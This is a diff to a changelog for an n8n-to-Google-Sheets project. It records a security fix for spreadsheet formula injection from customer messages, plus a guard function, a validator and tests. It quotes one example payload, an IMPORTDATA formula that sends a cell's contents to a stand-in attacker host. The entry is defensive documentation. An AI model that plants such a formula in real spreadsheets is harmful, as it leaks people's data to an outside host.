@@ -5,6 +5,36 @@ executed and observed.
 
 ---
 
+## [Unreleased] — Version 2, task V2-06 — Customer text is never a formula
+
+### Fixed (security)
+
+- **A customer could put a live formula into the team's sheet.** Every write is
+  `USER_ENTERED` (n8n's Google Sheets node v4.7 default; nothing overrode it),
+  so Sheets parsed each value as if someone typed it. A message such as
+  `=IMPORTDATA("https://attacker.example/?"&A2)` landed as a working formula in
+  `last_message`, `unanswered_messages` and Messages; a WhatsApp profile name is
+  customer-controlled too. Every value a workflow writes now goes through one
+  guard, `SHEET_SAFE_JS`: a string starting with `=`, `+`, `-`, `@`, a tab or a
+  carriage return gets a leading apostrophe, which Sheets keeps as text and does
+  not show. Numbers and booleans are untouched.
+- The build applies it to every Google Sheets node and every API append, so a
+  node added later cannot skip it.
+
+### Added
+
+- `validate-workflows.js`: every written value and every API append row must go
+  through the guard. Removing it from one column fails the build.
+- `tests/build/sheet-safe.test.js` (42 tests), including a hostile message sent
+  through a real generated append.
+- `docs/SECURITY.md`: the threat, and why the fix is not a switch to `RAW`.
+
+### Not yet verified
+
+- A message `=1+1` sent to the local stack, and seen in the sheet as `=1+1`.
+
+---
+
 ## [Unreleased] — Version 2, task V2-05 — One deleter, deleting by id, checked
 
 ### Fixed
